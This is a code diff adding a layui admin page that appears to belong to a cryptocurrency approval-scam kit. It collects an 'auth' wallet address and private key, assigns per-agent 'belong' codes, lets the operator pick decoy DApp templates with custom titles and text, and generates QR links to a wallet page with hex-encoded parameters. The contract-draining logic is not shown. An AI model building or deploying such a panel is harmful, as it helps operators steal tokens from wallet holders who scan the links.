@@ -1,0 +1,205 @@
+<div class='layuimini-container layuimini-page-anim'>
+  <div class='layuimini-main'>
+    <div class='layui-form layuimini-form' style='padding-top:50px'>
+      <div class='layui-form-item'>
+        <label class='layui-form-label required' t='auth_wallet_type'></label>
+        <div class='layui-input-block'>
+          <input type='radio' name='type' value='TRC20' it='TRC20'/><input type='radio' name='type' value='ERC20' it='ERC20'/>
+        </div>
+      </div>
+      <div class='layui-form-item'>
+        <label class='layui-form-label required' t='auth_wallet_address'></label>
+        <div class='layui-input-block'>
+          <input type='text' name='auth_address' lay-verify='required' p='pls_input_auth_address' value='' class='layui-input' autocomplete='off'/>
+        </div>
+      </div>
+      <div class='layui-form-item'>
+        <label class='layui-form-label required' t='auth_private_key'></label>
+        <div class='layui-input-block'>
+          <input type='text' name='auth_pkey' lay-verify='required' p='pls_input_auth_private_key' value='' class='layui-input' autocomplete='off'/>
+        </div>
+      </div>
+      <div class='layui-form-item'>
+        <label class='layui-form-label required' t='unique_belong'></label>
+        <div class='layui-input-inline'>
+          <input type='text' name='belong' lay-verify='required' p='pls_input_belong' value='' readonly class='layui-input' autocomplete='off'/>
+        </div>
+        <button id='generate_belong' class='layui-word-aux layui-btn layui-btn-normal' style='color:white!important' t='generate'></button>
+        <button id='reset_belong' class='layui-word-aux layui-btn layui-btn-primary' t='reset'></button>
+      </div>
+      <div class='layui-form-item'>
+        <label class='layui-form-label required' t='dapp_title'></label>
+        <div class='layui-input-block'>
+          <input type='text' name='dapp_title' lay-verify='required' p='pls_input_dapp_title' value='' class='layui-input' autocomplete='off'/>
+        </div>
+      </div>
+      <div class='layui-form-item'>
+        <label class='layui-form-label' t='dapp_desc'></label>
+        <div class='layui-input-block'>
+          <textarea name='dapp_desc' class='layui-textarea' p='pls_input_dapp_desc' autocomplete='off'></textarea>
+        </div>
+      </div>
+      <div class='layui-form-item'>
+        <label class='layui-form-label required' t='dapp_template'></label>
+        <div id='dapp_tmpl' class='layui-input-block'>
+          <input type='radio' name='dapp_template' lay-filter='dapp_tmpl' value='1' it='dapp_tp_1'/> <input type='radio' name='dapp_template' lay-filter='dapp_tmpl' value='2' it='dapp_tp_2'/>
+          <input type='radio' name='dapp_template' lay-filter='dapp_tmpl' value='3' it='dapp_tp_3'/> <input type='radio' name='dapp_template' lay-filter='dapp_tmpl' value='4' it='dapp_tp_4'/>
+          <input type='radio' name='dapp_template' lay-filter='dapp_tmpl' value='5' it='dapp_tp_5'/>
+        </div>
+      </div>
+      <div id='dapp_options' class='layui-form-item' style='display:none'>
+        <label class='layui-form-label required' t='dapp_options'></label>
+        <div class='layui-input-block'>
+          <div class='dos_row first' style='display:grid;grid-gap:3px;padding:3px;background:#ddd;grid-template-columns:1fr 4fr 1fr'>
+            <input class='dos_key' :p='dapp_options_key' autocomplete='off' style='text-align:center' readonly/>
+            <textarea class='dos_val' :p='dapp_options_val' autocomplete='off' style='min-height:38px;resize:vertical;padding:0 10px'></textarea>
+            <div class='layui-btn layui-btn-warm upload-bg' style='padding:0'><input type='file' style='display:none'/>
+              <div t='upload'></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class='layui-form-item'>
+        <label class='layui-form-label required' t='trx_num'></label>
+        <div class='layui-input-block'>
+          <input type='number' name='trx_num' lay-verify='required' p='pls_input_trx_num' value='0' class='layui-input' autocomplete='off'/>
+        </div>
+      </div>
+      <br/> <br/>
+      <hr/>
+      <br/>
+      <div class='layui-form-item'>
+        <div class='layui-input-block'>
+          <input type='hidden' name='id'/>
+          <button class='layui-btn layui-btn-normal' lay-submit lay-filter='config' t='save'></button>
+          <button id='preview' class='layui-btn layui-btn-warm' t='preview'></button>
+        </div>
+      </div>
+    </div>
+    <div class='layuimini-preview-dapp'></div>
+  </div>
+</div>
+
+<script src='/js/dapp/q.js'></script>
+<script>
+  layui.use(['jquery','form','layer'],function(){
+    const $ = layui.jquery,form = layui.form,layer = layui.layer;
+    const E = r => encodeURIComponent(r).split('').map(i => i.charCodeAt(0).toString(16)).join('');
+    const Dkeys = {
+      '1':['bg','bgc'],'2':['bg','bgc'],'3':['bg','bgc'],'4':['bg','bgc'],
+      '5':['bg','bgc','tbg','tcr','a_title','a_brief','lcr','aa_title','aa_text','ab_title','ab_text','b_title','b_brief','b_remark'],
+    };
+    let DappOpts = {tmpl:0,options:{}};
+    Api('ConfigInfo','post',null,data => {
+      for(let k in data){
+        if(k==='dapp_options') continue;
+        if(k==='type'||k==='dapp_template'){
+          $(`[name='${k}'][value='${data[k]}']`).attr('checked','checked');
+          if(k==='dapp_template'){
+            const $options = $('#dapp_options'),$clone = $options.find('.dos_row.first').clone();
+            DappOpts.tmpl = data.dapp_template;
+            DappOpts.options = data.dapp_options?(typeof data.dapp_options==='object'?data.dapp_options:JSON.parse(data.dapp_options)):{};
+            $clone.css('grid-template-columns','1fr 5fr');
+            $clone.find('.upload-bg').remove();
+            $clone.removeClass('first');
+            const html = $clone.get(0).outerHTML;
+            $options.find('.layui-input-block .dos_row:not(.first)').remove();
+            Dkeys[`${data[k]}`].forEach((k,i) => {
+              if(i>0) $options.find('.layui-input-block').append(html);
+              const $item = $options.find('.dos_row:last-child');
+              $item.find('.dos_key').data('key',k);
+              $item.find('.dos_key').val(Site.i18n[`dapp_opt_${k}`]);
+              $item.find('.dos_val').val(DappOpts.options[k]?DappOpts.options[k]:'');
+            });
+            $options.removeAttr('style');
+          }
+        }else{
+          $(`[name='${k}']`).val(data[k]);
+        }
+        if(k==='belong') $(`[name=belong]`).data('belong',data[k]);
+      }
+      setTimeout(form.render,500);
+    });
+    form.on('radio(dapp_tmpl)',data => {
+      const $options = $('#dapp_options'),$clone = $options.find('.dos_row.first').clone(),tmpl = data.value&& !isNaN(data.value)?parseInt(data.value):0;
+      $clone.css('grid-template-columns','1fr 5fr');
+      $clone.find('.upload-bg').remove();
+      $clone.removeClass('first');
+      const html = $clone.get(0).outerHTML;
+      $options.find('.layui-input-block .dos_row:not(.first)').remove();
+      Dkeys[`${tmpl}`].forEach((k,i) => {
+        if(i>0) $options.find('.layui-input-block').append(html);
+        const $item = $options.find('.dos_row:last-child');
+        $item.find('.dos_key').data('key',k);
+        $item.find('.dos_key').val(Site.i18n[`dapp_opt_${k}`]);
+        if(tmpl===DappOpts.tmpl) $item.find('.dos_val').val(DappOpts.options[k]?DappOpts.options[k]:'');
+      });
+      $options.removeAttr('style');
+    });
+    form.on('submit(config)',data => {
+      const body = data.field;
+      body.dapp_options = {};
+      if(parseInt(body.dapp_template)===5){
+        $('#dapp_options .dos_row').each((_,e) => {
+          const $e = $(e),key = $e.find('.dos_key').data('key'),val = $e.find('.dos_val').val().trim();
+          if(key&&/^[a-z_]+$/.test(key)) body.dapp_options[key] = val;
+        });
+      }
+      body.dapp_options = JSON.stringify(body.dapp_options);
+      Api('ConfigSave','post',body,r => layer.msg(Site.i18n[r?'success_save_config':'failed_save_config']),() => layer.msg(Site.i18n.failed_save_config));
+      return false;
+    });
+    $('#generate_belong').on('click',() => {
+      const belong = UUID().substring(0,5).toUpperCase();
+      $('[name=belong]').val(belong);
+      layer.msg(Site.i18n.success_generate_belong);
+    });
+    $('.upload-bg>div').on('click',e => $(e.currentTarget).parent().find('input').click());
+    $('.upload-bg>input').on('change',e => {
+      const files = e.currentTarget.files;
+      if(files.length<1){
+        $('.upload-bg').prev().val('');
+        return;
+      }
+      const file = files[0],type = file.type,size = file.size/(1024*1024);
+      if(!type.startsWith('image/')){
+        layer.msg(Site.i18n.not_image);
+        return;
+      }
+      if(size>2){
+        layer.msg(Site.i18n.big_image);
+        return;
+      }
+      const reader = new FileReader(),$val = $(e.currentTarget).parent().prev();
+      reader.onload = () => $val.val(reader.result);
+      reader.readAsDataURL(file);
+    });
+    $('#reset_belong').on('click',() => {
+      const belong = $('[name=belong]');
+      belong.val(belong.data('belong'));
+    });
+    $('#preview').on('click',() => {
+      const $preview = $('.layuimini-preview-dapp'),uid = sessionStorage.getItem('uid');
+      const tmpl = $(`#dapp_tmpl .layui-form-radioed`).prev('input').val(),title = $(`[name='dapp_title']`).val().trim();
+      const header = `<h2>${title}<span class='close'>X</span></h2>`;
+      const iframe = `<iframe src='/dapp.html?p=true&a=${uid}&b=${tmpl}&t=${encodeURIComponent(title)}'></iframe>`;
+      const qr = `<div class='qr'><div class='tip'>${Site.i18n.dapp_qr_tip}<span class='close_qr'>X</span></div><div id='dapp_qr'></div><div class='qr_link'></div></div>`;
+      $preview.html(header+iframe+qr+`<div class='select_wallet'>${Site.i18n.select_wallect}</div>`).addClass('show');
+    });
+    $('.layuimini-preview-dapp').on('click','.close',() => {
+      $('.layuimini-preview-dapp').removeClass('show');
+    }).on('click','.close_qr',() => {
+      $('.layuimini-preview-dapp>.qr').removeClass('show');
+    }).on('click','.select_wallet',e => {
+      const uid = sessionStorage.getItem('uid'),tmpl = $(`#dapp_tmpl .layui-form-radioed`).prev('input').val(),title = $(`[name='dapp_title']`).val().trim();
+      const url = `a=${uid}&b=${tmpl}&t=${encodeURIComponent(title)}`;
+      const link = location.href.split('/#').shift()+'/wallet.html?u='+E(url)+'&act=';
+      $('.layuimini-preview-dapp>.qr>#dapp_qr').html('');
+      $('.layuimini-preview-dapp>.qr>.qr_link').html(link);
+      new QRCode(document.getElementById('dapp_qr'),{text:link,width:128,height:128,colorDark:'#000',colorLight:'#fff',correctLevel:QRCode.CorrectLevel.H});
+      $('.layuimini-preview-dapp>.qr').addClass('show');
+    }).on('click','.btn_qr',() => {
+      $('.layuimini-preview-dapp>.qr').removeClass('show');
+    });
+  });
+</script>
